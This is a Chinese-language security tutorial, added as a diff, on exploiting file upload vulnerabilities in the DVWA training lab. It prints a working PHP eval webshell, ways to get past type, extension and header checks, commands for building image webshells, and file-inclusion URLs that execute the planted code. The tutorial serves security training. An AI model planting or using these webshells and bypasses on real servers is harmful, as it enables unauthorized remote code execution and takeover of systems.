@@ -1,0 +1,239 @@
+文件上传漏洞是一种通过上传恶意文件（如脚本、可执行文件等）到服务器并触发其执行，导致远程代码执行、敏感数据泄露或篡改系统行为的安全漏洞。
+
+可上传 php、asxp、html、svg
+
+判断后端语言
+
+> 1.看 url 显示的文件名
+>
+> 2.查看数据包
+>
+> 3.nmap 扫描
+
+判断文件上传路径
+
+> 1.看路径回显
+>
+> 2.头像可以看资源地址，得到路径
+>
+> 3.经验积累 
+>
+> 4.已知产品可模拟环境
+>
+> 5.未知产品扫目录
+
+> 注意：上传的文件可能会被随机命名，甚至会修改后缀名
+>
+> hash 值命名，时间戳
+>
+> 遇到漏洞理性分析，理性判断，不要死磕
+
+漏洞验证
+
+> 不要传一句话木马，验证漏洞存在即可，一定要无害化
+>
+> 密码不要过于简单，避免被其他黑客利用
+>
+> ```
+> <?php @echo md5("test");?>
+> ```
+>
+> > 后期可加入代码执行后自删除，一定不要涉及到其它文件
+
+webshell文件
+
+```
+<?php @eval($_POST[xuegod]);?>
+```
+
+> 注意命令执行的格式，如查看网页信息：`xuegod=phpinfo;` ，执行系统命令：`system(ls)`
+>
+> 使用蚁剑等 webshell 工具注意要用最新版，避免被反制
+
+# 1 基于 DVWA 的 low 级别演示文件上传漏洞
+
+进入 File Upload，直接上传任意文件 `webshell.php` 
+
+```
+<?php @eval($_POST[xuegod]);?>
+```
+
+> 此文件为执行 xuegod 的 php 文件
+
+成功上传可看到回显
+
+```
+../../hackable/uploads/webshell.php succesfully uploaded!
+```
+
+与 URL  `http://192.168.1.76/DVWA/vulnerabilities/upload/#` 拼接即可访问文件
+
+```
+http://192.168.1.76/DVWA/vulnerabilities/upload/../../hackable/uploads/webshell.php
+```
+
+> 未写入可显数据，无回显
+
+访问文件，在 HackBar 里利用密码操控目标
+
+```
+xuegod=phpinfo();
+```
+
+> 查看 PHP 信息
+
+```
+xuegod=system(id);
+```
+
+> 执行系统命令 `id`
+
+使用 webshell 工具，蚁剑连接目标
+
+```
+URL地址：http://192.168.1.76/DVWA/vulnerabilities/upload/../../hackable/uploads/webshell.php
+连接密码：xuegod
+```
+
+> 注意要用最新版，避免被反制
+
+# 2 基于 DVWA 的 Medium 级别演示文件上传漏洞
+
+进入 File Upload
+
+**限制文件后缀名为 jpeg 或 png，此时无法上传 php 文件**
+
+在 kali 中使用 mimetype 查看文件类型
+
+```
+┌──(root㉿Kali-24)-[~]
+└─# mimetype xuegod.jpg 
+xuegod.jpg: image/jpeg
+```
+
+>jpg 文件的文件类型为 `image/jpeg`
+
+1.可以开启拦截上传文件，在请求数据包中修改 `Content-Type` 为指定的文件类型，如 `Content-Type: image/jpeg` （用于绕过文件类型检测）
+
+2.可以修改文件名后缀为 jpg ，开启拦截在请求数据包中修改 `filename="webshell.jpg"` 为 `filename="webshell.php"` （避免上传文件无法执行）
+
+3.通过特殊符号绕过后缀名校验
+
+> php 5.2 可利用 00 截断（hello00.jpg）
+
+# 3 基于 DVWA 的 High 级别演示文件上传漏洞
+
+**限制文件后缀名为 jpeg 或 png，并且是有效图片（可以查看）**
+
+1.若是只是普通校验后缀名和文件头标识符，在代码中首部插入文件头，修改后缀即可（后缀修改参考 Medium ）
+
+FF D8 FF（jpg 的文件头）
+
+```
+FF D8 FF
+<?php @eval($_POST[xuegod]);?>
+```
+
+2.若严格校验后缀名，需要将 payload 植入到正常的图片文件中，上传后通过利用文件包含漏洞（可将 payload 写入 UA，目标会保留到日志中）加载图片中的代码执行
+
+例如：在 File Inclusion 中 
+
+```
+http://192.168.1.76/DVWA/vulnerabilities/fi/?page=file1.php
+```
+
+> 这个网站在   ` File Inclusion` 中会执行 `file1.php` 文件
+
+**在 linux 中制作图片马**
+
+在 kali 中制作一句话木马
+
+```
+┌──(root㉿Kali-24)-[~]
+└─# cat webshell.php                        
+<?php @eval($_POST[xuegod]);?>
+```
+
+上传一个普通的图片文件
+
+```
+┌──(root㉿Kali-24)-[~]
+└─# ls
+webshell.php  xuegod.jpg
+```
+
+将木马文件追加到图片中
+
+```
+┌──(root㉿Kali-24)-[~]
+└─# cat webshell.php >> xuegod.jpg
+```
+
+> 此时可在文件末尾看到 payload 代码
+
+**在 windows 中制作图片马**
+
+使图片文件和木马文件在一个文件夹下，在此文件夹下打开 cmd
+
+合并生成新文件
+
+```
+G:\>copy xuegod.jpg/b + webshell.php/a hello.jpg
+```
+
+> 此时生成的 hello.jpg 含有 webshell.php 的代码
+
+在 ` File Upload` 上传图片马
+
+```
+../../hackable/uploads/hello.jpg
+```
+
+进入 `File Inclusion` ，拼接 url
+
+```
+http://192.168.1.76/DVWA/vulnerabilities/fi/?page=file:///var/www/html/DVWA/hackable/uploads/hello.jpg
+```
+
+```
+http://centos7-6.local/dvwa/vulnerabilities/upload/?page=file:///var/www/html/dvwa/hackable/uploads/201457119579.jpg
+```
+
+```
+http://centos7-6.local/dvwa/vulnerabilities/upload/?page=file:///var/www/html/dvwa/hackable/uploads/201457119579.jpg
+```
+
+```
+../../hackable/uploads/201457119579.jpg
+```
+
+> 使用 file 协议和绝对路径
+
+利用密码执行代码
+
+```
+xuegod=phpinfo();
+```
+
+> 会在代码插入的地方显示反馈
+
+**在蚁剑中执行 payload 需要加入 Cookie 请求头**
+
+在目标页面获取 Cookie
+
+```
+>document.cookie
+'PHPSESSID=mm8prcunm801p1hb0bqjv7ig47; security=high'
+```
+
+将 Cookie 写入蚁剑请求信息即可
+
+![将 Cookie 写入蚁剑请求信息](./../../../../images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%B0%86%20Cookie%20%E5%86%99%E5%85%A5%E8%9A%81%E5%89%91%E8%AF%B7%E6%B1%82%E4%BF%A1%E6%81%AF.png)
+
+>要去掉单引号
+
+---
+
+参考链接
+
+- [Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
